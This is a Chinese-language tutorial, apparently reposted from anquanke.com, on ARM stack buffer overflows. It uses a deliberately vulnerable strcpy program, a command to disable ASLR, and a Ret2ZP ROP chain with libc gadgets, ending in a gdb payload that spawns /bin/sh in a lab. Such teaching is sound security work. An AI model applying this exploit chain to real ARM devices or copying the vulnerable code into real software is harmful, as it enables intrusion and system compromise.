> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.anquanke.com](https://www.anquanke.com/post/id/245248)

> ARM 指令集架构，常用于嵌入式设备和智能手机中，是从 RISC 衍生而来的。

[![](https://p3.ssl.qhimg.com/t012822e5f8d132fa67.jpg)](https://p3.ssl.qhimg.com/t012822e5f8d132fa67.jpg)

0x01 前言
-------

ARM 指令集架构，常用于嵌入式设备和智能手机中，是从 RISC 衍生而来的。并且 ARM 处理器几乎出现在所有的流行智能手机中，包括 IOS、Android、Window Phone 和黑莓操作系统，并且在嵌入式设备中经常出现，如电视机、路由器、智能网关等。ARM 和 x86 指令集架构先比，ARM 由于起精简指令集，具有高效，低耗能等优点，可以去确保在嵌入式系统上提供出色的性能。

0x02 缓冲区溢出原理
------------

缓冲区是用于保存数据的临时内存空间。缓冲区溢出通常发生在写入缓冲区的数据大于缓冲区大小时，由于边界检查不足，缓冲区溢出并写入相邻的内存位置，这些位置可能是一些重要的数据或返回地址等。

并且局部变量一般来说在程序中是充当缓冲变量或者缓冲区。

在缓冲区溢出中，我们的主要目的是用一些手段来修改返回地址，通过控制链接寄存器（LR）来控制程序执行流。

一旦我们控制了返回地址，返回地址将赋值给 PC 寄存器，劫持了 PC, 你就掌控了一切。

0x03 ARM 和 X86 对缓冲区溢出利用的区别
--------------------------

当一个程序开启 NX 保护之后，X86 架构下，首先想到的是 Ret2Libc 来绕过 NX ，篇幅有限，这里 Ret2Libc 就不展开说了。

但是在 ARM 架构中，Ret 到 Libc 是无法做到的，因为**在 ARM 处理器中，函数的参数是通过寄存器传递的**，而不是如 X86，函数的参数通过堆栈传递。因此在 ARM 实现和 x86 中 Ret2Libc 一样的效果，我们需要将参数放入到寄存器中。

这里使用到了 **Ret2ZP 技术**（Return To Zero Prevention）

举个例子，我们在栈溢出利用中，一般的思路是构造 gadgets，来执行 system(“/bin/sh”) 来获取 shell。 但是在构造 gadgets， 需要将 “/bin/sh” 传递到 system 函数执行时调用的寄存器 R0 中。

这里在 Ret2ZP 中常用的在 libc 中的 gadgets 有以下这些，是实际利用时，并不是每个都有用，选在实际环境中可以使用的就行。  
erand48

[![](https://p3.ssl.qhimg.com/t01a399bc3bba57d518.png)](https://p3.ssl.qhimg.com/t01a399bc3bba57d518.png)

lrand48

[![](https://p5.ssl.qhimg.com/t01448b3aebb4aaa91f.png)](https://p5.ssl.qhimg.com/t01448b3aebb4aaa91f.png)

seed48

[![](https://p2.ssl.qhimg.com/t01473165bf24ea44d9.png)](https://p2.ssl.qhimg.com/t01473165bf24ea44d9.png)

0x04 环境搭建
---------

这里使用的的 Raspbian 虚拟机，下载安装方法搜索引擎有很详细的文章。这里说明一下我搭建过程遇到的问题。

首先是在 Raspbian 虚拟机中 下载 gdb , 建议手动编译。因为 apt 下载的 gdb 是版本小于 8.1。在实际 gdb 调试会出现如下图所示问题

[![](https://p4.ssl.qhimg.com/t017caa8bae3be83ee0.png)](https://p4.ssl.qhimg.com/t017caa8bae3be83ee0.png)

解决方案：这是 gdb 因 ARM 程序内存损坏而造成的错误，最好的解决方式是安装 gdb-8.1 版本。[https://github.com/hugsy/gef/issues/206](https://github.com/hugsy/gef/issues/206)

编译完之后。运行 gdb 会出现如下错误

```
Python Exception <type 'exceptions.ImportError'> No module named gdb: 
/usr/local/bin/gdb: warning: 
Could not load the Python gdb module from `/home/pi/gdb-8.2/=/usr/share/gdb/python'.
Limited Python support is available from the _gdb module.
Suggest passing --data-directory=/path/to/gdb/data-directory.


```

解决方案：这是因为在编译的的时候需要指定编译环境是 python3.5，默认是 2.5，因此需要 ./configure —prefix=/usr —with-system-readline —with-python=/usr/bin/python3.5m 。

在编译的过程中还有可能会出现如下图所示的缺少库文件 “/usr/bin/ld: cannot find -lreadline “

[![](https://p2.ssl.qhimg.com/t01ed424667bbcc29c9.png)](https://p2.ssl.qhimg.com/t01ed424667bbcc29c9.png)

解决方案：sudo apt-get install libreadline6-dev

然后就是安装 gef 插件了。QAQ

0x05 缓冲区溢出实例
------------

### 1）漏洞代码

这里用一个最简单的代码来学习 Ret2ZP 技术，并且缓冲区溢出点特别明确，有 strcpy 函数将输入的大于 buf 分配内存大小的参数传入到固定大小的 buf 缓冲区，从而造成缓冲区溢出。

漏洞代码

```
#include <stdio.h>
#include <stdlib.h>

void do_echo(char* buffer)
{
    char buf[10];
    strcpy(buf,buffer);
}
int main(int argc, char **argv)
{
    do_echo(argv[1]);
    return(0);
}


```

关闭 ALSR 保护

`echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`

编译代码

`pi[@raspberrypi](https://github.com/raspberrypi "@raspberrypi"):~$ gcc -fno-stack-protector echo_arm1.c -o echo_arm`

查看编译后文件的保护情况。

[![](https://p0.ssl.qhimg.com/t01f6a35715ae1ee790.png)](https://p0.ssl.qhimg.com/t01f6a35715ae1ee790.png)

### 2） 确定溢出点并计算偏移

使用 gdb 打开文件调试，并且查看文件中函数的汇编代码，如下图所示。

[![](https://p3.ssl.qhimg.com/t01dac1efa3790dbb18.png)](https://p3.ssl.qhimg.com/t01dac1efa3790dbb18.png)

利用 pattern.py 生成字符串

[![](https://p0.ssl.qhimg.com/t01be49073c46fd392b.png)](https://p0.ssl.qhimg.com/t01be49073c46fd392b.png)

这里在 do_echo 函数的 0x00010468 处打断点。

运行程序并将 pattern 生成的字符串输入可以看到在执行到 0x00010468 处，R11 寄存器中值是”a5Aa”, 接下来计算出栈溢出的偏移地址

[![](https://p3.ssl.qhimg.com/t018217e8a82c3fc0cb.png)](https://p3.ssl.qhimg.com/t018217e8a82c3fc0cb.png)

经过计算，buf 缓冲区溢出到返回地址需要 16 个字节，也就是说劫持 PC 寄存器需要 16 个 padding。

[![](https://p4.ssl.qhimg.com/t0163c27219c2e2dba6.png)](https://p4.ssl.qhimg.com/t0163c27219c2e2dba6.png)

### 3) 构造 ROP Chain

这里利用 seed48 代码片段，当然也可以用我上面说的 lrand48。这里使用 seed48 比 lrand48 的 gadgets 要复杂一点点。

[![](https://p3.ssl.qhimg.com/t0141014bd3c224fc14.png)](https://p3.ssl.qhimg.com/t0141014bd3c224fc14.png)

可以看到 R11 寄存器后的值

[![](https://p5.ssl.qhimg.com/t01a2cdaf63fafd1cfc.png)](https://p5.ssl.qhimg.com/t01a2cdaf63fafd1cfc.png)

查找 system 函数地址 0xb6eab154

[![](https://p1.ssl.qhimg.com/t015184872b80de6845.png)](https://p1.ssl.qhimg.com/t015184872b80de6845.png)

查找 “/bin/sh” 所在的地址 0xb6f91944

[![](https://p0.ssl.qhimg.com/t017e3b54514febe8ce.png)](https://p0.ssl.qhimg.com/t017e3b54514febe8ce.png)

构造 ROP chain 如下图所示，根据 ARM 的特性，system 函数需要的参数需要 R0 寄存器传入到 system。因此需要将 “/bin/sh” 字符串的地址放入到 R0 寄存器中，这里 gadgets1 首先将栈上 “/bin/sh” 的地址传入到 R4 寄存器中，由于在 gadgets2 中 R0=R4+6 ，因此这个时候需要 0xb6f91944 减 6 ，然后在 PC 寄存器中放入 gadgets ，在执行 gadgets2 的过程中，会把 “/bin/sh” 正确的地址传入到 R0，然后输入 padding(“DDDD” ) 传入到 R4 , 再执行 system 函数从而获取 shell 。

[![](https://p0.ssl.qhimg.com/t01bb94c44e0754487b.png)](https://p0.ssl.qhimg.com/t01bb94c44e0754487b.png)

这里在构造的 payload 的时候，需要注意大小端的问题，这里文件是小端的，在小端字节序中，最低有效字节存储在最低地址。

AAAABBBBCCCCDDDD\x88\x30\xea\xb6\x3e\x19\xf9\xb6\x84\x30\xea\xb6DDDD\x54\xb1\xea\xb6

将构造的 payload 发送过去

```
 r `printf "AAAABBBBCCCCDDDD\x88\x30\xea\xb6\x3e\x19\xf9\xb6\x84\x30\xea\xb6DDDD\x54\xb1\xea\xb6"`


```

可以看到栈上成功覆盖到我们构造的 payload

[![](https://p2.ssl.qhimg.com/t0123e3065bef19b14e.png)](https://p2.ssl.qhimg.com/t0123e3065bef19b14e.png)

继续往下执行就可以拿到 shell

[![](https://p1.ssl.qhimg.com/t0190075d9811779970.png)](https://p1.ssl.qhimg.com/t0190075d9811779970.png)

0x06 总结
-------

Ret2ZP 技术，和 Ret2lib 的原理相差不大，但是由于 ARM 处理器的特性，函数执行的过程中，需要从 R0~R3 寄存器中获取参数，因此在构造 ROP 的时候，需要多考虑一点是将函数参数的值传入到 R0~R3 寄存器中。